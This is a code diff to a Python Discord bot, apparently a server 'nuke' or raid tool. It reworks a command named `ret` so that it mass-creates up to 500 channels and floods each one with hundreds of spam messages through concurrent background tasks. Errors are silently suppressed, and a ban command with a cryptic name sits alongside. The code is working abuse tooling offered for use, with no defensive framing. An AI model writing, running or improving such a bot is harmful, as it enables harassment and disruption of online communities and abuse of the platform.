@@ -128,22 +128,42 @@ async def ping(ctx):
 
 @bot.command()
 @commands.has_permissions(manage_channels=True)
-async def ret(ctx, amount: int = 300):
-    base_name = "CHANNEL NAME"
-    message = "SPAM MESSAGE"
+async def ret(ctx, cantidad: int = 100):
+    nombre_base = "CHANNELS NAME"
+    mensaje = "SPAM MESSAGE"
+    mensajes_por_canal = 400
 
-    if amount > 500:
+    if cantidad > 500:
         return
 
-    for i in range(1, amount + 1):
-        name = f"{base_name}-{i}"
-        try:
-            channel = await ctx.guild.create_text_channel(name=name)
-            await channel.send(message)
-            await asyncio.sleep(0)
-        except Exception as e:
-            await ctx.send(f"Error in `{name}`: {e}")
+    canales_nuevos = []
 
+    for i in range(1, cantidad + 1):
+        nombre = f"{nombre_base}-{i}"
+        try:
+            canal = await ctx.guild.create_text_channel(name=nombre)
+            canales_nuevos.append(canal)
+
+            tareas = [
+                asyncio.create_task(enviar_mensajes(c, mensaje, mensajes_por_canal))
+                for c in canales_nuevos
+            ]
+            asyncio.create_task(asyncio.gather(*tareas))
+
+            await asyncio.sleep(0)
+
+        except discord.Forbidden:
+            await ctx.send("No permission to create channels.")
+            return
+        except Exception:
+            pass
+async def enviar_mensajes(canal, mensaje, cantidad):
+    for _ in range(cantidad):
+        try:
+            await canal.send(mensaje)
+            await asyncio.sleep(0.5)
+        except:
+            pass
 @bot.command()
 @commands.has_permissions(ban_members=True)
 async def bn(ctx):
@@ -268,5 +288,6 @@ async def hlp(ctx):
 @bot.event
 async def on_ready():
     print(f'Bot connected as {bot.user}')
+
 
 bot.run("TOKEN DISCORD BOT")
